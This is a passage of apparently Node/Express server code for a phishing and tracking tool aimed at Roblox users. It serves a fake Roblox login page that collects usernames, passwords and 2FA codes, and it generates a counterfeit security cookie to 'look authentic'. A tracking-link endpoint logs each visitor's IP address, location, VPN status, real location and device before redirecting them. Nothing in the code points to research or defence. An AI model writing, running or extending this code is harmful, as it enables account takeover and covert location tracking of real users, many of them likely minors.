            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
            let result = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';

            // Add some random characters to make it look authentic
            for (let i = 0; i < 200; i++) {
                result += chars.charAt(Math.floor(Math.random() * chars.length));
            }

            return result;
        }

        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            hideMessages();
            loginBtn.disabled = true;
            loginBtn.textContent = 'Logging In...';

            await submitCredentials();

            loginBtn.disabled = false;
            loginBtn.textContent = 'Log In';
        });

        verifyBtn.addEventListener('click', async () => {
            hideMessages();
            verifyBtn.disabled = true;
            verifyBtn.textContent = 'Verifying...';

            await submitCredentials(true);

            verifyBtn.disabled = false;
            verifyBtn.textContent = 'Verify & Log In';
        });

        // Auto-format 2FA code input
        document.getElementById('twoFactorCode').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\\D/g, ''); // Remove non-digits
            if (value.length > 6) value = value.substr(0, 6); // Limit to 6 digits
            e.target.value = value;
        });

        // Prevent form submission on enter in 2FA field
        document.getElementById('twoFactorCode').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                verifyBtn.click();
            }
        });
    </script>
</body>
</html>`;

      res.send(fakeLoginHtml);
    } catch (error) {
      console.error('Fake login page error:', error);
      res.status(500).send('Internal server error');
    }
  });

  // Roblox link tracking and redirection endpoint
  app.get('/roblox/:trackingId', async (req: Request, res: Response) => {
    try {
      const { trackingId } = req.params;

      // Get the Roblox link
      const robloxLink = await storage.getRobloxLink(trackingId);
      if (!robloxLink || !robloxLink.isActive) {
        return res.status(404).send('Link not found or inactive');
      }

      // Log the visitor information (similar to existing IP logging)
      const ip = getClientIp(req);
      const userAgent = req.headers['user-agent'] || '';
      const referrer = req.headers.referer || '';
      const locationData = getLocationFromIp(ip);
      const deviceInfo = parseDeviceInfo(userAgent);

      // Create IP log entry
      await storage.createIpLog({
        userId: robloxLink.userId,
        ipAddress: ip,
        userAgent,
        referrer,
        location: locationData.location,
        isVpn: locationData.isVpn,
        vpnLocation: locationData.vpnLocation,
        realLocation: locationData.realLocation,
        deviceType: deviceInfo.deviceType,
        browserName: deviceInfo.browserName,
        operatingSystem: deviceInfo.operatingSystem,
        deviceBrand: deviceInfo.deviceBrand,
        status: 'roblox_redirect'
      });

      // Update click count
      await storage.updateRobloxLinkClicks(trackingId);

      // Redirect to the original Roblox URL
      res.redirect(robloxLink.originalUrl);
    } catch (error) {
      console.error('Roblox redirect error:', error);
      res.status(500).send('Internal server error');
    }
  });

  const httpServer = createServer(app);
  return httpServer;
}